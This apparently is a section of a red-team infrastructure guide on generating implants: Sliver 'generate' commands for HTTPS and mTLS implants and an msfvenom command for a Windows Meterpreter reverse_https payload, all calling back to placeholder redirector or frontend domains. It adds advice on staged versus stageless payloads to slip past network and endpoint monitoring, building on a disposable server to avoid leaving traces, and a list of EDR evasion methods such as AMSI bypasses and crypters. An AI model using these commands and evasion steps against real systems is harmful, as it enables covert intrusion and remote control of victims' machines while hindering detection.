# Payload generators

The infrastructure built in the preceding sections is inert until a payload calls back through it. The payload
is the artifact that lands on the target host and opens the first session; everything else is plumbing waiting
for that call. The key configuration is the callback address: the payload embeds the redirector's hostname, not
the C2 server's IP. The rest of the chain is invisible to it.

## Generating from Sliver

Sliver generates implants directly from the team server. For an HTTPS implant calling back through the
redirector:

```
sliver > generate \
    --os windows --arch amd64 \
    --http <redirector-domain> \
    --skip-symbols \
    --save /opt/infra/<operation>/

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is disabled
[*] Build completed in 18s
```

For mTLS, which encrypts the beacon traffic at the transport layer in addition to the C2's own encryption:

```
sliver > generate \
    --os linux --arch amd64 \
    --mtls <redirector-domain>:443 \
    --save /opt/infra/<operation>/
```

The redirector domain, not the frontend or backend IP, is what the implant knows. Rotating the redirector later
does not require regenerating the payload if a new redirector serves the same domain.

## msfvenom

Metasploit payloads are generated with msfvenom. The `LHOST` is the frontend domain:

```bash
msfvenom \
    -p windows/x64/meterpreter/reverse_https \
    LHOST=<frontend-domain> LPORT=443 \
    -f exe \
    -o /opt/infra/<operation>/payload.exe
```

Default Meterpreter signatures are widely detected on Windows. For Windows targets with any modern endpoint
product, use a custom stager or a framework with current evasion investment.

## Staged versus stageless

A staged payload is small: it fetches the full implant from the C2 on first execution, which makes the initial
artefact harder to scan but creates two network events. A stageless payload carries everything and makes one
connection, at the cost of a larger file. Against network monitoring that catches the staging fetch, stageless
is cleaner. Against endpoint products that scan file size, staged can be preferable.

## Build environment

Generate payloads on the [attack server](server.md), not on the operator's workstation. The build produces an
artefact with embedded C2 addresses; building locally leaves those addresses in local build logs and
filesystem artefacts. The attack server is destroyed at the end of the operation; the workstation is not.

For custom or obfuscated builds, a clean container on the attack server prevents build toolchain artefacts from
accumulating on the host between operations.

## EDR evasion

Default signatures for every open-source framework are known to endpoint products and have been for years.
Evasion is a separate discipline: process injection, reflective loading, AMSI bypasses, and custom
crypters each address specific detection layers. The payload generator is the start of that pipeline, not the
whole of it.
